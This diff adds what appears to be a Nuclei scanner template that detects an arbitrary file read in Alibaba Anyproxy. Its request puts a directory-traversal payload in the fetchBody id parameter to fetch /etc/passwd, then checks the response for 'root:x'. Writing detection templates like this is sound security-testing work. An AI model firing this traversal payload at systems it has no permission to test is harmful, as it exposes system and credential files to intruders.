@@ -1,0 +1,26 @@
+id: Alibaba-Anyproxy-fileRead
+
+info:
+  name: Alibaba Anyproxy fetchBody file arbitrary file read
+  author: str1am
+  severity: high
+  reference:
+    - https://github.com/alibaba/anyproxy/issues/391
+  tags: H5AnyproxyS,fileRead
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/fetchBody?id=1/../../../../../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:x"
+          - "CONNECT"
+        part: body
+        condition: and
